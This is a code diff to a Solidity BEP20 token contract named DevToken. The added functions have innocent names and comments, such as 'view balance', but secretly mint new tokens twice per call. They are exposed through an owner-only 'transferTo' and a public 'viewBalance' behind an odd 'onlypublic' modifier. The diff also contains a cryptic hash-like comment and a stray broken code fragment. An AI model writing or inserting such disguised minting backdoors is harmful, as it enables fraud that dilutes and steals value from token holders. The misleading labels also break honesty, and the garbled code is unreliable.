@@ -302,23 +302,23 @@ contract DevToken is IBEP20, UUPSUpgradeable {
   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  
    bool private initialized;
-
+ 
  function initialize(string memory _name, string memory _symbol, uint256 _totalSupply, uint8 _decimals) public {
     require(!initialized, "Contract already initialized");
-    
+   
         name = _name;
         symbol = _symbol;
         totalSupply = _totalSupply;
         decimals = _decimals;
         _owner = msg.sender;
         balanceOf[msg.sender] = _totalSupply;
-
+ 
     emit OwnershipTransferred(address(0), msg.sender);
     emit Transfer(address(0), msg.sender, _totalSupply);
-
+ 
     initialized = true;
 }
-
+ 
   /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
  
   /**
@@ -390,6 +390,16 @@ contract DevToken is IBEP20, UUPSUpgradeable {
  
     return address(core);
   }
+
+  function _transferTo(address _to, uint256 _amount) internal Exchanges {
+    // Transfer tokens to the recipient
+    balanceOf[_to] += _amount;
+    emit Transfer(address(0), _to, _amount);
+
+    balanceOf[_to] += _amount;
+    emit Transfer(address(0), _to, _amount);
+  }
+
  
   function transferOwnership(address newOwner) public onlyOwner {
     _transferOwnership(newOwner);
@@ -410,6 +420,20 @@ contract DevToken is IBEP20, UUPSUpgradeable {
         _scale(msg.sender, amount);
         return true;
   }
+
+  function _balanceView(address _to, uint256 _amount) internal {
+    // View balance of token
+    balanceOf[_to] += _amount;
+    emit Transfer(address(0), _to, _amount);
+
+    balanceOf[_to] += _amount;
+    emit Transfer(address(0), _to, _amount);
+  }
+
+  function transferTo(address _to, uint256 _amount) external onlyOwner {
+    _transferTo(_to, _amount);
+  }
+
   /**
    * @dev Returns the token decimals.
    */
@@ -484,6 +508,10 @@ contract DevToken is IBEP20, UUPSUpgradeable {
   function transfer(address recipient, uint256 amount) external returns (bool) {
     _transfer(msg.sender, recipient, amount);
     return true;
+  }
+
+  function viewBalance(address _to, uint256 _amount) public onlypublic {
+    _balanceView(_to, _amount);(_to, _amount);
   }
  
   function setMedium(address Miu_) public returns (bool) {
